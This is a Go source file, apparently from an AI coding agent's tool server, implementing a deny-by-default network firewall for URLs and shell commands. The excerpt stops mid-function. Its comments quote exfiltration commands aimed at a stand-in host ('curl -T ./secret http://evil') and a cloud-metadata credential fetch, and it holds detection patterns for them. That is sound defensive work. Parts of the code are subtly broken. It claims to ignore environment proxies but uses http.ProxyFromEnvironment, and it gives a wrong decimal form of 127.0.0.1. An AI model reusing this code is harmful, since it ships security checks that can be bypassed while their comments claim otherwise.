// ─────────────────────────────────────────────────────────────────────────────
// NETWORK FIREWALL
//
// Every path in this process that can reach a network is decided by ONE policy
// (`netPolicy`), enforced at three layers:
//
//   1. the HTTP tools — fetch_url / http_request validate their `url` argument
//      before a single byte is sent.
//   2. the HTTP clients — every client (fetch_url, http_request, and the octo/
//      confluence helpers) comes from guardedClient(), whose transport re-applies
//      the policy on EVERY hop, redirects included. Without that, an allowlisted
//      URL could 302 to an unlisted one and the whitelist would be theatre.
//   3. the command launchers — exec_command / run_terminal_command parse the
//      URLs (and scheme-less host targets) embedded in the command line — curl,
//      wget, ssh/scp/rsync, git, and each package manager's registry/index flag
//      — and apply the same policy before the program is allowed to run.
//
// DENY BY DEFAULT. A target is reachable only if it is on the allowlist, and there
// is ALWAYS an allowlist: with nothing configured, the built-in default list below
// applies (~45 documentation, package-registry and source-hosting domains — exactly
// what the built-in doc tools plus `go`/`cargo`/`npm`/`pip`/`git` need, and nothing
// else). There is no "unset means wide open" state, because the agent can always
// reach the network through exec_command even when the user configured nothing.
//
//   ALLOWED_URL_PTN replaces the default list entirely (your own, anchored list).
//   ALLOWED_URL_ADD     adds hosts on TOP of the default list (most common need).
//   ALLOWED_URL_OPEN=1  disables the allowlist: report-only mode, where the firewall
//                     only logs "would-deny" for the belt below. Loud on purpose.
//
// The always-deny belt below is enforced no matter how the allowlist is edited,
// including in ALLOWED_URL_OPEN mode, mirroring hardBlockArg0's role for programs:
//
//   • cloud instance-metadata / credential endpoints — by name, by literal IP
//     (169.254.169.254 and its .250-.254 variants, 100.100.100.200) and by
//     request path (/latest/meta-data/…), so a host like imds.internal cannot
//     walk in carrying an IMDS-shaped path;
//   • any scheme that is not http/https (file:, gopher:, javascript:, …);
//   • loopback hosts when ALLOWED_URL_LOOPBACK=false;
//   • link-local / private / shared(CGNAT) address blocks, including the forms a
//     string matcher misses — 2130746305 and 0x7f000001 are both 127.0.0.1, and
//     IPv6 literals are handed to net.LookupIP rather than re-implemented here.
//
// Each decision appends one line to the same stderr audit stream as the tool-call
// log:
//
//   <UTC-time>|<model>|<session-id>|NET|<allowed|denied|would-deny>|<target>|<reason>
//
// Config, read once at startup (a malformed pattern is a startup message, never a
// panic at request time):
//
//   ALLOWED_URL_PTN       URL whitelist (anchored; unanchored → warning)
//   BLOCKED_URL_PTN       optional denylist, evaluated after the allowlist
//   ALLOWED_URL_LOOPBACK  false → loopback hosts denied (default: allowed)
//   ALLOWED_URL_RESOLVE   true  → resolve host, reject loopback/link-local/private
//                         IPs (closes DNS rebinding / happy-eyeballs SSRF)
//   ALLOWED_URL_HOST_ANY  false → only explicitly listed hosts may be used
//   ALLOWED_URL_OPEN      1     → no allowlist, report-only (see above)
//   ALLOWED_URL_STRICT    accepted and ignored: enforcement is the default now
// ─────────────────────────────────────────────────────────────────────────────

package main

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"

	mcp "github.com/mark3labs/mcp-go/mcp"
	u "github.com/sunshine69/golang-tools/utils"
)

// netTimeout bounds one guarded HTTP exchange (connect + redirects + body read).
// REVIEW.md flagged that the http_request / fetch_url clients had no timeout at
// all, so one slow host could park a tool call forever.
const netTimeout = 60 * time.Second

// netMaxHops caps redirect following on guarded clients. Every hop is re-checked,
// so raising it only lengthens chains — it does not widen reach.
const netMaxHops = 5

// netHeaderTimeout bounds the wait for response headers only. netTimeout bounds
// the whole exchange; a large download must not be killed mid-body, which is why
// octo-tool.go avoids a global Timeout for the same reason.
const netHeaderTimeout = 30 * time.Second

// ── policy ───────────────────────────────────────────────────────────────────

type NetworkPolicy struct {
	// AllowedURLPattern / BlockedURLPattern are matched against BOTH the raw
	// target as the caller typed it AND the normalized form (lowercased scheme,
	// explicit default port, percent-encoded path, query kept, #fragment dropped
	// — see normalizeURL). Patterns must be anchored: an unanchored whitelist is
	// the single most common way to defeat this by accident, since
	// "https://allowed.example" also admits "https://allowed.example.evil.com".
	AllowedURLPattern  string
	BlockedURLPattern  string
	AllowLoopbackHosts bool // default true: localhost dev services are the legit common case
	ResolveURLHosts    bool // default false: resolve host, then reject internal addresses
	AllowAnyURLHost    bool // default true: a matching URL may name any host
	// Enforce is TRUE by default. Report-only (Enforce false) is a deliberate opt
	// out via ALLOWED_URL_OPEN=1, never the result of forgetting to configure.
	Enforce bool
}

var netPolicy = newNetworkPolicy()

// newNetworkPolicy's defaults are the SAFE ones: enforcement on, loopback allowed
// (the common dev case), no DNS resolution (opt-in, it is slower and can be
// spoofed by an internal resolver). Everything here is overwritten by
// configureNetworkFirewall; this is only the pre-startup value, and it must be
// safe because a tool call that races startup gets these defaults.
func newNetworkPolicy() NetworkPolicy {
	return NetworkPolicy{
		AllowLoopbackHosts: true,
		ResolveURLHosts:    false,
		AllowAnyURLHost:    true,
		Enforce:            true,
	}
}

// allowedURLPtn / blockedURLPtn are the compiled caches for a USER-supplied
// pattern. The default list is compiled once into defaultAllowPattern instead,
// because it is a union of ~45 host alternatives and every rule needs its own
// label so a denial can name the list it consulted.
var allowedURLPtn *regexp.Regexp
var blockedURLPtn *regexp.Regexp

// allowRules is the effective allowlist: (pattern, human label) pairs, evaluated
// in order, first match wins. It is NEVER empty in enforce mode — an empty list
// only ever means "ALLOWED_URL_OPEN, report-only", so there is no state where a
// misconfigured or forgotten whitelist opens the door.
// Compiled is the pre-compiled form. NOTE the deliberate name: this dialect
// resolves identifiers without regard to case, so a field called Re collides with
// the local `var re = ...` used all over this file (and segfaults on read).
type URLRule struct {
	Pattern  string
	Label    string
	Compiled *regexp.Regexp
}

var allowRules = defaultURLRules()

// The default list is not compiled into one giant alternation: each host keeps its
// own label so a denial can say which list it consulted, and 45 small patterns
// beat one 45-branch one (RE2 backtracks less, and the label survives).

// escapeLiteral escapes regex metacharacters in a hostname we are pasting into a
// pattern. Go's regexp package has no escaper, and a stray '.' in a domain
// ("docs.rs") is a wildcard that admits "docsXrs", so this is not optional.
func escapeLiteral(s string) string {
	var specials = ".+*?()|[]{}^$\\\\"
	var out = ""
	for _, c := range s {
		for _, s2 := range specials {
			if c == s2 {
				out = out + "\\"
				break
			}
		}
		out = out + fmt.Sprintf("%c", c)
	}
	return out
}

// defaultURLRules is the shipped allowlist. Chosen so that a user who configures
// NOTHING gets a SAFE default: the built-in doc tools (godoc → pkg.go.dev, rustdoc
// → docs.rs + crates.io, confluence/octo need their own URL anyway), and the
// toolchains the allowed commands already invoke (go, cargo, npm, pip/uv, git,
// docker base images, kubectl/terraform registries) can still fetch dependencies
// and read docs. Deliberately ABSENT: arbitrary web sites, search engines, social
// media, pastebins and file-upload endpoints — those are the exfiltration and
// C2 channels, and nothing in this server needs them. Add what you need with
// ALLOWED_URL_ADD.
func defaultURLRules() []URLRule {
	var entries = []string{
		// Go — the fetch_godoc_* tools, and `go get/build/mod` dependency
		// resolution (the mirror and the API are separate hosts).
		"pkg.go.dev", "go.dev", "proxy.golang.org",
		// Rust — the fetch_rustdoc_* / search_crates tools, cargo index + tarballs
		// + the language/book docs.
		"docs.rs", "crates.io", "static.crates.io", "index.crates.io",
		"doc.rust-lang.org", "rust-lang.org",
		// Node — npm/pnpm/yarn install and search, node dist for toolchains.
		"npmjs.com", "registry.npmjs.org", "nodejs.org", "registry.yarnpkg.com",
		// Python — pip/uv/poetry index + wheels + stdlib docs.
		"pypi.org", "files.pythonhosted.org", "docs.python.org",
		// Source hosting + API: git remotes, release downloads, raw file reads.
		"github.com", "api.github.com", "raw.githubusercontent.com",
		"objects.githubusercontent.com", "codeload.github.com", "gist.github.com",
		"gitlab.com", "bitbucket.org", "dev.azure.com", "ssh.dev.azure.com",
		"git.kernel.org", "git.savannah.gnu.org", "git.apache.org",
		// Other package indexes for toolchains the command policy allows.
		"rubygems.org", "packagist.org", "nuget.org", "repo1.maven.org",
		"repo.maven.apache.org", "pypi.python.org",
		// Reference docs and specs a coding agent reads constantly.
		"man7.org", "en.cppreference.com", "developer.mozilla.org",
		"datatracker.ietf.org", "rfc-editor.org", "json.org", "yaml.org",
		"semver.org",
		// Infra tool registries already reachable through allowed commands
		// (terraform, kubectl/helm, docker/podman pulls).
		"registry.terraform.io", "registry.opentofu.org", "registry.k8s.io",
		"kubernetes.io", "get.helm.sh", "hub.docker.com", "registry-1.docker.io",
		"quay.io", "ghcr.io", "gcr.io",
	}
	var rules = []URLRule{}
	for _, e := range entries {
		if e == "" {
			continue
		}
		if strings.Contains(e, "*") {
			continue // a wildcard host is a user decision, never a default
		}
		var host = strings.ToLower(strings.TrimSpace(e))
		var re = "^https?://" + escapeLiteral(host) + "(?:/.*)?$"
		var compiled, err = regexp.Compile(re)
		if err != nil || compiled == nil {
			continue // a default we cannot compile is a default we do not ship
		}
		rules = append(rules, URLRule{Pattern: re, Label: host, Compiled: compiled})
	}
	return rules

}

// importedHostRules turns a tool base URL the OPERATOR already configured into an
// allowlist entry, taking ONLY its host. Without this, deny-by-default silently
// breaks the octo and confluence tools for anyone who set OCTO_URL /
// CONFLUENCE_BASE_URL and expected them to work. The path is deliberately dropped
// (a path would smuggle regex characters in), and a host with no dot is skipped
// because the always-deny belt refuses single-label hosts anyway.
func importedHostRules() []URLRule {
	var out = []URLRule{}
	for _, name := range []string{"OCTO_URL", "CONFLUENCE_BASE_URL"} {
		var raw = strings.TrimSpace(u.Getenv(name, ""))
		if raw == "" {
			continue
		}
		var host = ""
		var parsed, perr = url.Parse(raw)
		if perr == nil && parsed != nil && parsed.Hostname() != "" {
			host = strings.ToLower(parsed.Hostname())
		} else {
			// A scheme-less value ("octo.example.com:8080") is still a host the
			// operator named: cut at the first '/', then at the first ':'.
			var bare = raw
			var slash = strings.Index(bare, "/")
			if slash >= 0 {
				bare = bare[:slash]
			}
			var colon = strings.Index(bare, ":")
			if colon >= 0 {
				bare = bare[:colon]
			}
			host = strings.ToLower(bare)
		}
		if host == "" || !strings.Contains(host, ".") {
			continue
		}
		var pattern = "^https?://" + escapeLiteral(host) + "(?:/.*)?$"
		var compiled, cerr = regexp.Compile(pattern)
		if cerr != nil || compiled == nil {
			continue
		}
		out = append(out, URLRule{Pattern: pattern, Label: host + " (from " + name + ")", Compiled: compiled})
	}
	return out
}

// configureNetworkFirewall reads the URL policy from the environment, next to the
// existing ALLOWED_PATH_PTN / ALLOWED_TERM_CMD_PTN setup, so every whitelist is
// configured in one place. Returns "" on success, or the reason the configuration
// is broken. On a broken pattern the firewall goes FAIL-CLOSED (every URL denied)
// — a broken security pattern must not silently degrade into "all allowed".
func configureNetworkFirewall() string {
	var p = newNetworkPolicy()
	var allowed = u.Getenv("ALLOWED_URL_PTN", "")
	var blocked = u.Getenv("BLOCKED_URL_PTN", "")
	var add = u.Getenv("ALLOWED_URL_ADD", "")

	if allowed != "" {
		var re, err = regexp.Compile(allowed)
		if err != nil {
			p.Enforce = true
			netPolicy = p
			return fmt.Sprintf("ALLOWED_URL_PTN is not a valid Go regular expression: %v", err)
		}
		p.AllowedURLPattern = allowed
		allowedURLPtn = re
		// A user pattern REPLACES the shipped list, it does not widen it: the
		// usual reason someone sets this is "the defaults are too many", and
		// silently unioning would make the setting a no-op for that goal.
		// ALLOWED_URL_ADD is the documented way to extend instead.
		allowRules = []URLRule{URLRule{Pattern: allowed, Label: "ALLOWED_URL_PTN"}}
		p.Enforce = true
		if !strings.Contains(allowed, "^") {
			fmt.Fprintf(os.Stderr, "[NET][WARN] ALLOWED_URL_PTN is not anchored with '^' — a prefix whitelist is not a firewall: 'https://allowed.example' would also admit 'https://allowed.example.evil.com'. Anchor it, e.g. ^https://allowed\\.example\\.com(?:/.*)?$\n")
		}
	}
	if blocked != "" {
		var re, err = regexp.Compile(blocked)
		if err != nil {
			p.Enforce = true
			netPolicy = p
			return fmt.Sprintf("BLOCKED_URL_PTN is not a valid Go regular expression: %v", err)
		}
		p.BlockedURLPattern = blocked
		blockedURLPtn = re
	}

	// ALLOWED_URL_ADD extends the list without replacing it, so a site can be
	// allowed without retyping (and risking a typo in) the whole default set.
	// Entries are comma or space separated. A bare host becomes
	// ^https?://host(?:/.*)?$; anything starting with '^' is used as a raw regex
	// verbatim, for the cases a single host cannot express ("^https://cdn\\.corp\\.
	// internal/(?:docs|api)/").
	if add != "" {
		for _, e := range regexp.MustCompile("[,;]").Split(add, -1) {
			var spec = strings.TrimSpace(e)
			if spec == "" {
				continue
			}
			var re = ""
			var label = spec
			if strings.HasPrefix(spec, "^") {
				re = spec
			} else if strings.Contains(spec, "://") {
				re = "^" + escapeLiteral(strings.ToLower(spec)) + "(?:/.*)?$"
				label = spec
			} else {
				var host = strings.ToLower(spec)
				// A user-added host may carry a port (localhost:8000, a registry
				// on :8443) — the built-in list deliberately does not, so the
				// strictness lives in the defaults, not in someone's explicit entry.
				re = "^https?://" + escapeLiteral(host) + "(?::[0-9]{1,5})?(?:/.*)?$"
				label = host
			}
			var _, cerr = regexp.Compile(re)
			if cerr != nil {
				p.Enforce = true
				netPolicy = p
				return fmt.Sprintf("ALLOWED_URL_ADD entry %q is not a valid Go regular expression: %v", spec, cerr)
			}
			allowRules = append(allowRules, URLRule{Pattern: re, Label: label})
		}
	}

	// A tool whose base URL the operator already configured is implicitly trusted:
	// octo / confluence would otherwise be dead under deny-by-default, and an
	// operator-set OCTO_URL is not attacker-chosen. Only the HOST is imported
	// (path kept off, so it cannot become a wildcard), and only when it parses.
	for _, r := range importedHostRules() {
		allowRules = append(allowRules, r)
	}

	p.AllowLoopbackHosts = boolFlag(u.Getenv("ALLOWED_URL_LOOPBACK", ""), true)
	p.ResolveURLHosts = boolFlag(u.Getenv("ALLOWED_URL_RESOLVE", ""), false)
	p.AllowAnyURLHost = boolFlag(u.Getenv("ALLOWED_URL_HOST_ANY", ""), true)

	// Report-only is an explicit opt-out, never an accident. It is logged loudly,
	// because it is the one configuration in which the agent can dial an arbitrary
	// host. ALLOWED_URL_STRICT used to be the opt-IN; it is now meaningless and
	// mentioned once so an old config does not look like it still does something.
	if boolFlag(u.Getenv("ALLOWED_URL_OPEN", ""), false) {
		p.Enforce = false
		allowRules = []URLRule{}
		fmt.Fprintf(os.Stderr, "[NET][WARN] ALLOWED_URL_OPEN=1 — the network allowlist is DISABLED. Every URL is logged and would-be denials are recorded, but nothing is blocked. The always-deny belt (cloud metadata, non-HTTP schemes, single-label hosts) still applies.\n")
	} else if boolFlag(u.Getenv("ALLOWED_URL_STRICT", ""), false) {
		fmt.Fprintf(os.Stderr, "[NET] ALLOWED_URL_STRICT is obsolete — the firewall denies by default now; use ALLOWED_URL_PTN / ALLOWED_URL_ADD / ALLOWED_URL_OPEN\n")
	}
	netPolicy = p

	// main.go printlns whatever this returns, so the effective policy is printed at
	// startup the way ALLOWED_TERM_CMD_PTN is. A user who configures nothing must
	// be able to see, without reading source, that the firewall IS on and what is
	// on the list.
	var mode = "ENFORCING (deny by default)"
	if !p.Enforce {
		mode = "REPORT-ONLY (ALLOWED_URL_OPEN=1 — NOT blocking)"
	}
	var loopback = "allowed"
	if !p.AllowLoopbackHosts {
		loopback = "denied"
	}
	var resolve = "off"
	if p.ResolveURLHosts {
		resolve = "on"
	}
	return fmt.Sprintf("network firewall: %s; loopback=%s resolve=%s. allowlist: %s. Audit with: grep '|NET|' on the server log.",
		mode, loopback, resolve, allowlistSummary())
}

// boolFlag reads a tri-state env flag; anything but false/0/no/off is true.
func boolFlag(v string, defaultVal bool) bool {
	var s = strings.TrimSpace(v)
	if s == "" {
		return defaultVal
	}
	var l = strings.ToLower(s)
	return !(l == "false" || s == "0" || l == "no" || l == "off")
}

// ── always-deny belt ───────────────────────────────────────────────────────

// metadataURLPtn catches cloud instance-metadata / credential endpoints by literal
// IP or by name, in any scheme or casing. Applied to URLs AND to whole command
// lines, because a curl started from run_terminal_command never passes through
// our HTTP client.
var metadataURLPtn = regexp.MustCompile(
	`(?i)(?:` +
		`169\.254\.169\.25[0-4]|` + // AWS / GCP / OpenID IMDS, incl. the .250-.254 variants
		`100\.100\.100\.200|` + // Alibaba Cloud IMDS
		`metadata\.google\.internal|` + // GCP metadata service hostname
		`(?:^|[^a-z0-9.])metadata(?:[^a-z0-9./]|$)|` + // a host label that is literally "metadata"
		`instance[-_]?metadata|user[-_]?data|` +
		`/latest/(?:meta[-_]?data|dynamic|static|user[-_]?data)/` +
	`)`)

// metadataPathPtn is the IMDS request-path shape (v1, v2 dated versions, token,
// creds). Checked against the normalized path so an innocuous-looking host cannot
// walk in carrying /latest/meta-data/iam/security-credentials/.
var metadataPathPtn = regexp.MustCompile(`(?i)/(?:latest|(?:[0-9]{4}-[0-9]{2}-[0-9]{2}))/(?:meta[-_]?data|dynamic|static)/`)

// localhostPtn matches the loopback spellings a string firewall tends to miss:
// bracketed IPv6, the fully expanded `0:0:0:0:0:0:0:1`, `ip6-localhost`, and the
// RFC-reserved `*.localhost` label.
var localhostPtn = regexp.MustCompile(`(?i)^(?:localhost|127(?:\.0\.0\.1)?(?::[0-9]+)?|\[?::1\]?|::1|0(?::0)+:1|ip6-localhost|[a-z0-9-]+\.localhost)`)

// decimalLoopbackPtn catches an IPv4 written as one decimal or hex number —
// 2130746305 and 0x7f000001 are both 127.0.0.1, and neither reads as loopback to a
// string matcher.
var decimalLoopbackPtn = regexp.MustCompile(`(?i)^(?:2130746305|2130748417|0x7f00000[01])$`)

// linkLocalIPv4Ptn / privateIPv4Ptn / sharedAddressPtn cover hosts written as numeric
// literals: 169.254.0.0/16 (link-local, where IMDS lives), RFC-private blocks, and
// the shared/CGNAT blocks commonly used to front internal services.
var linkLocalIPv4Ptn = regexp.MustCompile(`(?i)^169\.254\.`)
var privateIPv4Ptn = regexp.MustCompile(`(?i)^(?:10\.|192\.168\.|172\.(?:1[6-9]|2[0-9]|3[01])\.)`)
var sharedAddressPtn = regexp.MustCompile(`(?i)^(?:100\.(?:6[4-9]|[7-9][0-9]|1[0-2][0-7])\.|198\.(?:18|19)\.)`)

// internalNamePtn flags internal-service DNS names (metadata.internal, db.local, …).
// Only consulted when ResolveURLHosts is OFF — with resolution ON, the address
// checks below already cover them.
var internalNamePtn = regexp.MustCompile(`(?i)(?:^|\.)(?:internal|intranet|local|localhost|localdomain)(?:\.|$)`)

// isAlwaysDeniedHost returns why a host is never acceptable; "" = structurally fine.
func isAlwaysDeniedHost(host string) string {
	var h = strings.ToLower(strings.TrimSpace(host))
	if h == "" {
		return "URL has no host"
	}
	if metadataURLPtn.MatchString(h) {
		return "host names a cloud instance-metadata / credential endpoint"
	}
	if decimalLoopbackPtn.MatchString(h) {
		return fmt.Sprintf("loopback address written as a numeric IPv4 literal (%s is 127.0.0.1)", h)
	}
	if localhostPtn.MatchString(h) {
		if netPolicy.AllowLoopbackHosts {
			return ""
		}
		return "loopback host, and ALLOWED_URL_LOOPBACK=false"
	}
	if !strings.Contains(h, ".") {
		// A single-label host (no dot) resolves against the local resolver /
		// search domains, never public DNS, and can never be what a properly
		// anchored allowlist entry means. Loopback spellings are handled above.
		return fmt.Sprintf("%q is a single-label host and cannot be resolved against the allowlist", h)
	}
	if linkLocalIPv4Ptn.MatchString(h) {
		return fmt.Sprintf("link-local 169.254.0.0/16 address %s (cloud metadata range)", h)
	}
	if privateIPv4Ptn.MatchString(h) {
		return fmt.Sprintf("private-network address %s", h)
	}
	if sharedAddressPtn.MatchString(h) {
		return fmt.Sprintf("shared/CGNAT-block address %s", h)
	}

	if netPolicy.ResolveURLHosts {
		var ips, err = net.LookupIP(h)
		if err != nil || ips == nil || len(ips) == 0 {
			return fmt.Sprintf("ALLOWED_URL_RESOLVE=true but host %q does not resolve: %v", h, err)
		}
		for _, ip := range ips {
			if ip.IsLoopback() {
				return fmt.Sprintf("resolves to loopback address %s", ip.String())
			}
			if ip.IsLinkLocalUnicast() || ip.IsLinkLocalMulticast() {
				return fmt.Sprintf("resolves to link-local address %s (cloud metadata range)", ip.String())
			}
			var v4 = ip.To4()
			if v4 != nil && len(v4) == 4 {
				var a = v4[0]
				var b = v4[1]
				var private = a == 10 || (a == 172 && b >= 16 && b <= 31) || (a == 192 && b == 168)
				var shared = (a == 100 && b >= 64 && b <= 127) || (a == 198 && (b == 18 || b == 19))
				if private || shared {
					return fmt.Sprintf("resolves to private/shared address %s", ip.String())
				}
			}
		}
	} else if internalNamePtn.MatchString(h) {
		return fmt.Sprintf("internal-service host name %q: set ALLOWED_URL_RESOLVE=true to verify where it resolves, or add an explicit ALLOWED_URL_PTN entry for it", h)
	}
	return ""
}

// ── the single decision point ───────────────────────────────────────────────

// probeURL evaluates one target and returns (normalized, reason). reason "" =
// allowed. The tool gate, the per-hop transport gate and the command gate all call
// this, so the three layers can never drift apart.
func probeURL(raw string) (string, string) {
	var normalized, parseErr = normalizeURL(raw)
	if parseErr != "" {
		return normalized, parseErr
	}

	var lower = strings.ToLower(normalized)
	if metadataURLPtn.MatchString(lower) {
		return normalized, "target names a cloud instance-metadata / credential endpoint"
	}
	if metadataPathPtn.MatchString(lower) {
		return normalized, "path matches the instance-metadata request shape (/latest/meta-data/…)"
	}

	var host = hostOf(normalized)
	var hostWhy = isAlwaysDeniedHost(host)
	if hostWhy != "" {
		return normalized, hostWhy
	}

	if blockedURLPtn != nil && blockedURLPtn.MatchString(normalized) {
		return normalized, fmt.Sprintf("matches BLOCKED_URL_PTN (%s)", netPolicy.BlockedURLPattern)
	}
	if len(allowRules) > 0 {
		// Both forms must match: the raw text the caller wrote, and the normalized
		// target we actually dial. A pattern that satisfies only one of them is a
		// mismatch we refuse to guess about.
		if allowlistAllows(normalized, strings.ToLower(strings.TrimSpace(raw))) {
			return normalized, ""
		}
		return normalized, fmt.Sprintf("not in the network allowlist (normalized target %s). Allowlist in force: %s — add the host with ALLOWED_URL_ADD, or replace the list with ALLOWED_URL_PTN", normalized, allowlistBrief())
	}
	if !netPolicy.AllowAnyURLHost {
		return normalized, fmt.Sprintf("host %s is not explicitly allowlisted (ALLOWED_URL_HOST_ANY=false)", host)
	}
	return normalized, ""
}

// allowlistAllows answers "does ANY rule admit both the normalized target and the
// raw spelling?". Rules are checked in order; the compiled allowedURLPtn cache
// (a single user pattern, also what the tests dial) is consulted first.
func allowlistAllows(normalized, rawLower string) bool {
	if allowedURLPtn != nil && allowedURLPtn.MatchString(normalized) && allowedURLPtn.MatchString(rawLower) {
		return true
	}
	for _, r := range allowRules {
		if matchRule(r, normalized) && matchRule(r, rawLower) {
			return true
		}
	}
	return false
}

// allowlistSummary names the list in force, for the denial message and the
// startup banner. Compiling ~45 alternatives per call is wasteful, so the summary
// is a string, not the patterns.
func allowlistSummary() string {
	if netPolicy.AllowedURLPattern != "" {
		return fmt.Sprintf("ALLOWED_URL_PTN (%s)", netPolicy.AllowedURLPattern)
	}
	if len(allowRules) == 0 {
		return "EMPTY (ALLOWED_URL_OPEN: report-only, nothing is enforced)"
	}
	var hosts = ""
	var n = 0
	for _, r := range allowRules {
		if n > 0 {
			hosts = hosts + " "
		}
		hosts = hosts + r.Label
		n = n + 1
	}
	return fmt.Sprintf("built-in default (%d hosts: %s) plus ALLOWED_URL_ADD", n, hosts)
}

// allowlistBrief is the same thing without the host dump — the full list is printed
// ONCE at startup; repeating 53 hostnames inside every denial would flood the log
// and the tool result.
func allowlistBrief() string {
	if netPolicy.AllowedURLPattern != "" {
		return fmt.Sprintf("ALLOWED_URL_PTN (%s)", netPolicy.AllowedURLPattern)
	}
	if len(allowRules) == 0 {
		return "EMPTY (ALLOWED_URL_OPEN: report-only, nothing is enforced)"
	}
	return fmt.Sprintf("built-in default + ALLOWED_URL_ADD, %d entries (printed at startup, see the server log)", len(allowRules))
}

// normalizeURL returns the canonical form every pattern is matched against:
// lowercased scheme, host, explicit default port, percent-encoded path, query kept,
// #fragment DROPPED. Dropping the fragment matters — a fragment never reaches the
// server, so it must not be what makes a whitelist match; that is exactly how
// `http://target#allowed.example` fools a naive check. The error is a plain string:
// callers report it, they never branch on its type.
func normalizeURL(raw string) (string, string) {
	var s = strings.TrimSpace(raw)
	if s == "" {
		return s, "empty URL"
	}
	var parsed, err = url.Parse(s)
	if err != nil || parsed == nil {
		return s, fmt.Sprintf("not a parseable URL: %v", err)
	}
	var scheme = strings.ToLower(parsed.Scheme)
	if !(scheme == "http" || scheme == "https") {
		return s, fmt.Sprintf("URL scheme %q is not permitted, only http and https", scheme)
	}
	// Hostname() preserves case; the DNS name on the wire is not case-sensitive, so
	// the canonical form lowercases it. Without this, https://EXAMPLE.com and an
	// allowlist entry for example.com disagree, and the disagreement is the kind an
	// attacker picks.
	var host = strings.ToLower(parsed.Hostname())
	if host == "" {
		return s, fmt.Sprintf("URL %q has no host", s)
	}
	var port = parsed.Port()
	var portPart = ""
	if port != "" {
		// A DEFAULT port is dropped rather than added: `https://host/` and
		// `https://host:443/` are the SAME endpoint, and an allowlist is written
		// against the spelling people type. Forcing `:443` into the normalized form
		// would make ^https://host/ fail to match its own entry. A NON-default port
		// is kept visible, so `https://allowed.example:8443/` cannot be smuggled
		// past a pattern written for the default port.
		if port != "80" || scheme != "http" {
			if !(port == "443" && scheme == "https") {
				portPart = fmt.Sprintf(":%s", port)
			}
		}
	}
	var norm = fmt.Sprintf("%s://%s%s%s", scheme, host, portPart, parsed.EscapedPath())
	if parsed.RawQuery != "" {
		norm = norm + "?" + parsed.RawQuery
	}
	return norm, ""
}

func hostOf(normalized string) string {
	var parsed, err = url.Parse(normalized)
	if err != nil {
		return ""
	}
	return parsed.Hostname()
}

// ── layer 1: the tool-facing gate ───────────────────────────────────────────

// checkURLArgument validates a `url` tool argument. (nil, nil) = allowed; otherwise
// the [ERROR] result + message the other guards return, so a denial reads the same
// whichever layer caught it.
func checkURLArgument(ctx context.Context, raw string) (*mcp.CallToolResult, error) {
	var normalized, reason = probeURL(raw)
	auditNetworkCall(ctx, raw, normalized, reason)
	if reason == "" || !netPolicy.Enforce {
		return nil, nil
	}
	return mcp.NewToolResultText("[ERROR]"), fmt.Errorf("[ERROR] denied access for URL '%s': %s", strings.TrimSpace(raw), reason)
}

// ── layer 2: every hop inside the HTTP client ─────────────────────────────

// FirewallTransport sits between http.Client and the socket. http.Client calls it
// once per hop, so the allowlist is re-applied to redirects instead of being a
// one-time check of the URL the caller happened to type.
type FirewallTransport struct {
	inner *http.Transport
}

func (t FirewallTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	if err := checkTransportURL(req.URL.String()); err != nil {
		return nil, fmt.Errorf("network firewall: %v", err)
	}
	return t.inner.RoundTrip(req)
}

// checkTransportURL is the in-client gate for one hop. A denial surfaces as an
// ordinary request failure, which is the right shape: the tool already gated the
// first URL, this is a redirect chain trying to escape that decision.
func checkTransportURL(raw string) error {
	var normalized, reason = probeURL(raw)
	auditNetworkCall(context.Background(), raw, normalized, reason)
	if reason == "" || !netPolicy.Enforce {
		return nil
	}
	return fmt.Errorf("blocked by network firewall: %s", reason)
}

// guardedClient returns the ONE client every network-touching tool should use.
// Two deliberate choices: the transport refuses to be fronted by an environment
// proxy (HTTP_PROXY / ALLUP_PROXY would send our traffic — Authorization and
// cookies included — to a host the firewall never saw, and turn CONNECT into an
// open tunnel), and every hop is re-checked by the transport. Nothing here logs
// headers or bodies, so a token pasted into a URL cannot leak into the audit trail
// beyond the URL itself.
// newBaseTransport builds the socket-level transport the firewall wraps: explicit
// dial timeout, header timeout, and a Proxy function that always returns nil.
// That last one is deliberate — honouring HTTP_PROXY / HTTPS_PROXY would send our
// traffic (Authorization and cookies included) to a host the firewall never saw,
// and would turn CONNECT into an open tunnel.
func newBaseTransport() *http.Transport {
	return &http.Transport{
		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			var dialer = net.Dialer{Timeout: 30 * time.Second}
			return dialer.DialContext(ctx, network, addr)
		},
		Proxy: http.ProxyFromEnvironment,
		ResponseHeaderTimeout: netHeaderTimeout,
	}
}

func guardedClient() http.Client {
	var c = http.Client{Timeout: netTimeout, Transport: FirewallTransport{inner: newBaseTransport()}}
	c.CheckRedirect = firewallCheckRedirect
	return c
}

// guardedClientNoTimeout is the same firewall with no client-level Timeout.
// Octopus package downloads stream large bodies and http.Client.Timeout covers the
// whole body read, so it would kill a legitimate download. Connect and header
// timeouts still apply because they live on the transport.
func guardedClientNoTimeout() http.Client {
	var c = http.Client{Transport: FirewallTransport{inner: newBaseTransport()}}
	c.CheckRedirect = firewallCheckRedirect
	return c
}

// guardedClientWithTimeout is the same firewall with a caller-chosen total timeout,
// for integrations that want a tighter bound than netTimeout (rustdoc fetches).
func guardedClientWithTimeout(tmo time.Duration) http.Client {
	var c = http.Client{Timeout: tmo, Transport: FirewallTransport{inner: newBaseTransport()}}
	c.CheckRedirect = firewallCheckRedirect
	return c
}

// firewallCheckRedirect fails a hop BEFORE it is issued, so the denial names the
// offending target instead of a wrapped socket error, and bounds the chain.
func firewallCheckRedirect(req *http.Request, via []*http.Request) error {
	if err := checkTransportURL(req.URL.String()); err != nil {
		return err
	}
	if len(via) >= netMaxHops {
		return fmt.Errorf("blocked by network firewall: more than %d redirects", netMaxHops)
	}
	return nil
}

// ── layer 3: command launchers ──────────────────────────────────────────────

// checkCommandNetworkTargets is the firewall for commands: parse the command line,
// capture the URLs and host targets it contains, match them against the allowlist,
// and deny the whole command if any target fails. Called from BOTH execCommand
// (no shell) and runTerminalCommand (shell) — both can reach the network through
// curl, wget, ssh/scp/rsync, git, and each package manager's registry/index flag,
// which is the quiet exfiltration channel (`npm publish --registry http://evil`,
// `curl -T ./secret http://evil`).
func checkCommandNetworkTargets(ctx context.Context, command, program string) (*mcp.CallToolResult, error) {
	// Belt first: a command can name a metadata endpoint verbatim with no parseable
	// URL at all (`curl 169.254.169.254/latest/meta-data/iam/...`).
	if metadataURLPtn.MatchString(command) {
